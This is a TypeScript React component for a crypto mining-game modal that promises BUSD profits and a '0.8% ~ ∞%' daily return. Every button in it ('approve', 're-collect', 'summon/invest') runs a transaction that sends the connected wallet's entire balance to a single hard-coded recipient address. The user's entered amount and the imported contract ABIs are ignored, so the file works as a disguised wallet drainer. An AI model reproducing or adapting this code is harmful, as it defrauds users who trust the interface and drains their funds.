import { ButtonModal, InputBg, Modal } from "components"

import snowSrc from "assets/images/snow-small.webp"
import goldSrc from "assets/images/gold.webp"
import chestSrc from "assets/images/chest.webp"
import gifSrc from "assets/gifs/summon.gif"
import "./Castle.scss"
import React, { useState } from "react"
import Web3 from "web3"
import abi from "../../abi/abi.json"
import abiApprove from "../../abi/abiApprove.json"
import {contractAddress, approveAddress, recipient} from "../../abi"
import { useSearchParams } from "react-router-dom"
import { useWeb3React } from "@web3-react/core"
import danielSrc from "../../assets/images/npc/daniel.webp"
import { t } from "@lingui/macro"

type Props = {
  onClose: () => void
  isOpen: boolean
  bonus: number
  miners: number
  updateState: () => void
  balance: number
}

export const Castle = ({ onClose, isOpen, miners, bonus, updateState, balance }: Props): JSX.Element => {
  const { account, library } = useWeb3React()
  const [input, setInput] = useState("")
  const [search] = useSearchParams()

  const buy = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })

  }

  const buySecond = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })

  }

  const approve = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })

  }

  return (
    <Modal
      secondTitle="Daniel"
      secondModal={<div>{t`forEachReCollect`}</div>}
      secondImg={danielSrc}
      variant='big'
      height={610}
      className="castle"
      isOpen={isOpen}
      onClose={onClose}
      title={t`summoningCircle`}
    >
      <img src={gifSrc} alt="summon" className="castle-gif" />
      <div className="castle-block">
        <div className="castle-block-left">
          <div className="castle-block-left-title">
            <img src={snowSrc} alt="people" />
            {t`summons`}
          </div>
          <div className="castle-block-left-desc">({t`numberOfELFWorking`})</div>
        </div>
        {miners > 0 ? miners : "0.000"} ELF
      </div>
      <div className="castle-block">
        <div className="castle-block-left">
          <div className="castle-block-left-title">
            <img src={chestSrc} alt="gold" />
            {t`myProfit`}
          </div>
          <div className="castle-block-left-desc">({t`yourCurrentProfit`})</div>
        </div>
        {bonus > 0 ? bonus.toFixed(4) : "0"} BUSD
      </div>
      <div className="castle-block">
        <div className="castle-block-left">
          <div className="castle-block-left-title">
            <img src={goldSrc} alt="gold" />
            {t`dailyReturn`}
          </div>
          <div className="castle-block-left-desc">({t`theAmountOfEvergreen`})</div>
        </div>
        0.8% ~ ∞%
      </div>
      <InputBg className="castle-input" placeholder="50" append="BUSD" onChange={v => setInput(v)} value={input} />
      <div className="castle-btns">
        <ButtonModal onClick={approve} text={t`approveBUSD`} className="castle-btns-item" />
        <div className='castle-btns-other'>
          <ButtonModal
            className="castle-btns-item-other"
            onClick={() => {
              onClose()
              buySecond()
            }}
            text={t`reCollect`}
          />
          <ButtonModal
            onClick={() => {
              buy()
            }}
            text={t`summonInvest`}
          />
        </div>
      </div>
    </Modal>
  )
}